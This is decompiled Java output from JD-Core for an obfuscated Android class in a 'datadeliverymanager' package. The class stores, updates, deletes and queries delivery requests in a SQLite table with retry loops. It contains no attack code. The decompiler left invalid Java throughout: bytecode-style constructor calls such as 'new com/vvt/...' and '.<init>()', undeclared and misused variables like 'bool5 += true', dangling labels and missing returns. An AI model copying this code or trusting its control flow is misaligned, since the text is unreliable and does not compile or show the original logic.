package com.vvt.datadeliverymanager.b.a;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.os.SystemClock;
import com.vvt.datadeliverymanager.a;
import com.vvt.datadeliverymanager.enums.DataProviderType;
import com.vvt.datadeliverymanager.enums.DeliveryRequestType;
import com.vvt.datadeliverymanager.enums.PriorityRequest;
import com.vvt.datadeliverymanager.h;
import com.vvt.io.p;
import com.vvt.phoenix.prot.command.b;

public class d
{
  private static final boolean a = a.e;
  private static final boolean b = a.b;
  private static final boolean c = a.a;
  private SQLiteDatabase d;
  private c e;
  private String f;
  
  public d(Context paramContext, String paramString)
  {
    this.f = paramString;
    String str = p.a(this.f, "ddmmgr.db");
    c localc = new com/vvt/datadeliverymanager/b/a/c;
    localc.<init>(paramContext, str, 1);
    this.e = localc;
  }
  
  private ContentValues a(PriorityRequest paramPriorityRequest, DeliveryRequestType paramDeliveryRequestType, long paramLong1, boolean paramBoolean1, int paramInt1, int paramInt2, DataProviderType paramDataProviderType, long paramLong2, boolean paramBoolean2, boolean paramBoolean3)
  {
    ContentValues localContentValues = new android/content/ContentValues;
    localContentValues.<init>();
    Object localObject1 = Integer.valueOf(paramPriorityRequest.getNumber());
    localContentValues.put("priority_request", (Integer)localObject1);
    localObject1 = Integer.valueOf(paramDeliveryRequestType.getNumber());
    localContentValues.put("delivery_request_type", (Integer)localObject1);
    localObject1 = Long.valueOf(paramLong1);
    localContentValues.put("csId", (Long)localObject1);
    localObject1 = Boolean.valueOf(paramBoolean1);
    localContentValues.put("ready_to_resume", (Boolean)localObject1);
    localObject1 = Integer.valueOf(paramInt1);
    localContentValues.put("retry_count", (Integer)localObject1);
    localObject1 = Integer.valueOf(paramInt2);
    localContentValues.put("max_retry_count", (Integer)localObject1);
    int i = paramDataProviderType.getNumber();
    localObject1 = Integer.valueOf(i);
    localContentValues.put("data_provider_type", (Integer)localObject1);
    Object localObject2 = "delay_time";
    localObject1 = Long.valueOf(paramLong2);
    localContentValues.put((String)localObject2, (Long)localObject1);
    localObject1 = "is_require_encryption";
    int j;
    if (paramBoolean2)
    {
      j = 1;
      localObject2 = Integer.valueOf(j);
      localContentValues.put((String)localObject1, (Integer)localObject2);
      localObject1 = "is_require_compression";
      if (!paramBoolean3) {
        break label220;
      }
      j = 1;
    }
    for (;;)
    {
      localObject2 = Integer.valueOf(j);
      localContentValues.put((String)localObject1, (Integer)localObject2);
      return localContentValues;
      j = 0;
      localObject2 = null;
      break;
      label220:
      j = 0;
      localObject2 = null;
    }
  }
  
  private ContentValues c(h paramh)
  {
    int i = 1;
    ContentValues localContentValues = new android/content/ContentValues;
    localContentValues.<init>();
    Object localObject1 = Integer.valueOf(paramh.a());
    localContentValues.put("caller_id", (Integer)localObject1);
    localObject1 = Integer.valueOf(paramh.c().a());
    localContentValues.put("cmd_id", (Integer)localObject1);
    localObject1 = Integer.valueOf(paramh.e().getNumber());
    localContentValues.put("priority_request", (Integer)localObject1);
    localObject1 = Integer.valueOf(paramh.f().getNumber());
    localContentValues.put("delivery_request_type", (Integer)localObject1);
    localObject1 = Long.valueOf(paramh.g());
    localContentValues.put("csId", (Long)localObject1);
    localObject1 = Boolean.valueOf(paramh.b());
    localContentValues.put("ready_to_resume", (Boolean)localObject1);
    localObject1 = Integer.valueOf(paramh.h());
    localContentValues.put("retry_count", (Integer)localObject1);
    localObject1 = Integer.valueOf(paramh.j().getNumber());
    localContentValues.put("data_provider_type", (Integer)localObject1);
    int j = paramh.i();
    localObject1 = Integer.valueOf(j);
    localContentValues.put("max_retry_count", (Integer)localObject1);
    Object localObject2 = "delay_time";
    long l = paramh.k();
    localObject1 = Long.valueOf(l);
    localContentValues.put((String)localObject2, (Long)localObject1);
    localObject1 = "is_require_encryption";
    int k = paramh.l();
    if (k != 0)
    {
      k = i;
      localObject2 = Integer.valueOf(k);
      localContentValues.put((String)localObject1, (Integer)localObject2);
      localObject2 = "is_require_compression";
      boolean bool = paramh.m();
      if (!bool) {
        break label279;
      }
    }
    for (;;)
    {
      Integer localInteger = Integer.valueOf(i);
      localContentValues.put((String)localObject2, localInteger);
      return localContentValues;
      int m = 0;
      localObject2 = null;
      break;
      label279:
      i = 0;
      localInteger = null;
    }
  }
  
  public long a(h paramh)
  {
    ContentValues localContentValues = c(paramh);
    long l1 = -1;
    i = 0;
    do
    {
      try
      {
        Object localObject = this.d;
        if (localObject != null)
        {
          localObject = this.d;
          bool1 = ((SQLiteDatabase)localObject).isOpen();
          if (bool1) {}
        }
        else
        {
          bool1 = b;
          if (bool1) {}
          localObject = this.e;
          localObject = ((c)localObject).getWritableDatabase();
          this.d = ((SQLiteDatabase)localObject);
        }
        localObject = this.d;
        String str = "ddm";
        l1 = ((SQLiteDatabase)localObject).insert(str, null, localContentValues);
        bool1 = false;
        localObject = null;
      }
      catch (SQLiteException localSQLiteException)
      {
        for (;;)
        {
          boolean bool1;
          int j;
          boolean bool2 = a;
          if (bool2) {}
          bool2 = true;
          i += 1;
          long l2 = 1000L;
          SystemClock.sleep(l2);
        }
      }
      if (!bool1) {
        break;
      }
      j = 10;
    } while (i < j);
    return l1;
  }
  
  public d a()
  {
    SQLiteDatabase localSQLiteDatabase = this.e.getWritableDatabase();
    this.d = localSQLiteDatabase;
    return this;
  }
  
  public boolean a(long paramLong)
  {
    bool1 = true;
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    String str1 = "csId=" + paramLong;
    int i = 0;
    localStringBuilder = null;
    j = 0;
    do
    {
      try
      {
        Object localObject = this.d;
        if (localObject != null)
        {
          localObject = this.d;
          bool2 = ((SQLiteDatabase)localObject).isOpen();
          if (bool2) {}
        }
        else
        {
          bool2 = a;
          if (bool2) {}
          localObject = this.e;
          localObject = ((c)localObject).getWritableDatabase();
          this.d = ((SQLiteDatabase)localObject);
        }
        localObject = this.d;
        String str2 = "ddm";
        i = ((SQLiteDatabase)localObject).delete(str2, str1, null);
        bool2 = false;
        localObject = null;
      }
      catch (SQLiteException localSQLiteException)
      {
        for (;;)
        {
          boolean bool2;
          int k;
          boolean bool3 = a;
          if (bool3) {}
          j += 1;
          long l = 1000L;
          SystemClock.sleep(l);
          bool3 = bool1;
          continue;
          bool1 = false;
        }
      }
      if (!bool2) {
        break;
      }
      k = 10;
    } while (j < k);
    if (i > 0) {
      return bool1;
    }
  }
  
  public void b()
  {
    this.e.close();
  }
  
  public boolean b(h paramh)
  {
    PriorityRequest localPriorityRequest = paramh.e();
    Object localObject1 = paramh.f();
    long l1 = paramh.g();
    boolean bool1 = paramh.b();
    int i = paramh.h();
    int j = paramh.i();
    DataProviderType localDataProviderType = paramh.j();
    long l2 = paramh.k();
    boolean bool2 = paramh.l();
    boolean bool3 = paramh.m();
    localObject2 = this;
    ContentValues localContentValues = a(localPriorityRequest, (DeliveryRequestType)localObject1, l1, bool1, i, j, localDataProviderType, l2, bool2, bool3);
    boolean bool4 = c;
    if (bool4) {}
    localObject2 = new java/lang/StringBuilder;
    ((StringBuilder)localObject2).<init>();
    localObject2 = ((StringBuilder)localObject2).append("caller_id=");
    int n = paramh.a();
    localObject2 = ((StringBuilder)localObject2).append(n).append(" AND ").append("cmd_id").append("=");
    n = paramh.c().a();
    localObject2 = ((StringBuilder)localObject2).append(n).append(" AND ").append("data_provider_type").append("=");
    n = paramh.j().getNumber();
    String str1 = n;
    n = 0;
    localPriorityRequest = null;
    bool4 = false;
    localObject2 = null;
    for (;;)
    {
      try
      {
        localObject1 = this.d;
        if (localObject1 != null)
        {
          localObject1 = this.d;
          i2 = ((SQLiteDatabase)localObject1).isOpen();
          if (i2 != 0) {}
        }
        else
        {
          i2 = a;
          if (i2 != 0) {}
          localObject1 = this.e;
          localObject1 = ((c)localObject1).getWritableDatabase();
          this.d = ((SQLiteDatabase)localObject1);
        }
        int i2 = c;
        if (i2 != 0) {}
        i2 = c;
        if (i2 != 0) {}
        localObject1 = this.d;
        String str2 = "ddm";
        i = 0;
        k = ((SQLiteDatabase)localObject1).update(str2, localContentValues, str1, null);
        i2 = 1;
        if (k > i2)
        {
          bool6 = a;
          if (!bool6) {
            continue;
          }
        }
        bool6 = false;
        localObject1 = null;
      }
      catch (SQLiteException localSQLiteException)
      {
        int k;
        boolean bool6;
        int i3;
        boolean bool5;
        boolean bool7 = a;
        if (!bool7) {
          continue;
        }
        bool7 = true;
        int i1;
        bool5 += true;
        long l3 = 1000L;
        SystemClock.sleep(l3);
        continue;
        int m = 0;
        localObject2 = null;
        continue;
      }
      if (bool6)
      {
        i3 = 10;
        if (n < i3) {}
      }
      else
      {
        bool5 = c;
        if (bool5) {}
        bool5 = c;
        if ((bool5) && (k <= 0)) {
          continue;
        }
        k = 1;
        return k;
        bool7 = a;
        if (!bool7) {}
      }
    }
  }
  
  public Cursor c()
  {
    int i = 10;
    int j = 1;
    boolean bool = false;
    Object localObject1 = null;
    String str1 = "priority_request DESC, _id";
    Object localObject3 = null;
    int k = 0;
    for (;;)
    {
      try
      {
        localObject1 = this.d;
        if (localObject1 != null)
        {
          localObject1 = this.d;
          bool = ((SQLiteDatabase)localObject1).isOpen();
          if (bool) {}
        }
        else
        {
          bool = a;
          if (bool) {}
          localObject1 = this.e;
          localObject1 = ((c)localObject1).getWritableDatabase();
          this.d = ((SQLiteDatabase)localObject1);
        }
        localObject1 = this.d;
        String str2 = "ddm";
        m = 13;
        String[] arrayOfString = new String[m];
        int n = 0;
        String str3 = "_id";
        arrayOfString[0] = str3;
        n = 1;
        str3 = "caller_id";
        arrayOfString[n] = str3;
        n = 2;
        str3 = "cmd_id";
        arrayOfString[n] = str3;
        n = 3;
        str3 = "priority_request";
        arrayOfString[n] = str3;
        n = 4;
        str3 = "delivery_request_type";
        arrayOfString[n] = str3;
        n = 5;
        str3 = "csId";
        arrayOfString[n] = str3;
        n = 6;
        str3 = "ready_to_resume";
        arrayOfString[n] = str3;
        n = 7;
        str3 = "retry_count";
        arrayOfString[n] = str3;
        n = 8;
        str3 = "max_retry_count";
        arrayOfString[n] = str3;
        n = 9;
        str3 = "data_provider_type";
        arrayOfString[n] = str3;
        n = 10;
        str3 = "delay_time";
        arrayOfString[n] = str3;
        n = 11;
        str3 = "is_require_encryption";
        arrayOfString[n] = str3;
        n = 12;
        str3 = "is_require_compression";
        arrayOfString[n] = str3;
        n = 0;
        str3 = null;
        localObject1 = ((SQLiteDatabase)localObject1).query(str2, arrayOfString, null, null, null, null, str1);
        i1 = k;
        m = 0;
        arrayOfString = null;
      }
      catch (SQLiteException localSQLiteException)
      {
        bool = a;
        if (!bool) {
          continue;
        }
        int i1 = k + 1;
        long l = 1000L;
        SystemClock.sleep(l);
        Object localObject2 = localObject3;
        int m = j;
        continue;
        localObject3 = localObject2;
        k = i1;
      }
      if ((m == 0) || (i1 >= i)) {
        return (Cursor)localObject1;
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/datadeliverymanager/removeFromPath/a/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */